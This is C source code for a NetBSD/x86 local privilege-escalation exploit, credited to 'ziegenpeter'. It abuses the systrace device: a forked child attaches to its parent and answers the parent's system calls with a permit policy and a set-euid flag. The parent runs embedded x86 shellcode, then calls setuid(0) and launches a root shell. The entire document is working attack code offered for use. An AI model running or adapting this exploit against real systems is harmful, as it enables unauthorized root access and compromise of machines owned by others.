#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/systrace.h>

#define systrace_device "/dev/systrace"

char MAGIC[] = "\x53\x31\xc0\x50\x50\x50\x50\xb8\x03\x00\x00\x00"
        "\xcd\x80\x83\xc4\x10\xb8\x00\x00\xc0\xbf\x94\x50"
        "\xb8\x03\x00\x00\x00\xcd\x80\x5b\x87\xe3\x5b\xc3";

void (*magic)(void) = MAGIC;

int nbsd_systrace_open()
{
        int fd;

        printf("[+] Connecting to %s... ", systrace_device);
        fd = open(systrace_device, O_RDONLY, 0);
        if (fd == -1) {
                perror("failed with error: ");
                printf("\nSorry but the exploit failed\n");
                exit(1);
        }
        printf("done.\n");

        return (fd);
}

int nbsd_attach_parent(int fd)
{
        pid_t pid = getppid();

        printf("[+] Attaching to parent... ");
        if (ioctl(fd, STRIOCATTACH, &pid) == -1) {
                perror("failed with error: ");
                printf("\nSorry but the exploit failed\n");
        }
        printf("done.\n");
        return (0);
}

void nbsd_handle_msg(int fd)
{
        struct str_message msg;
        struct systrace_answer ans;
        int r;

        r = read(fd, &msg, sizeof(msg));

        if (r != sizeof(msg)) {
                exit(1);
        }

        memset(&ans, 0, sizeof(ans));
        ans.stra_pid = msg.msg_pid;
        ans.stra_seqnr = msg.msg_seqnr;
        ans.stra_policy = SYSTR_POLICY_PERMIT;
        ans.stra_flags =
SYSTR_FLAGS_RESULT|SYSTR_FLAGS_SETEUID|SYSTR_FLAGS_SETEUID;
        ans.stra_error = 0;
        ans.stra_seteuid = getuid();
        ans.stra_setegid = getgid();

        if (ioctl(fd, STRIOCANSWER, &ans) == -1);

}

void doit()
{
        int p,f,fd;

        fd = nbsd_systrace_open();

        f = fork();

        if (f == 0) {
                sleep(1);
                nbsd_attach_parent(fd);
                while (1) {
                        nbsd_handle_msg(fd);
                }
                exit(1);
        }
        printf("[+] Doing some magic... ");
        sleep(2);
        magic();

        setuid(0);
        setgid(0);

        kill(f, 9);

        if (getuid() != 0) {
                printf("failed.\n");
                printf("\nSorry but the exploit failed.");
                exit(1);
        }

        printf("done.\n\n");

        system("uname -v");
        system("id");
        execlp("/bin/sh", "/bin/sh", 0);
}

void banner()
{
        printf("NetBSD/x86 systrace local root exploit\n");
        printf("by ziegenpeter\n\n");

        if (getuid() == 0) {
                printf("no comment\n");
                exit(1);
        }
}

int main(int argc, char **argv)
{
        int fd;
        banner();
        doit();
        return (0);
}
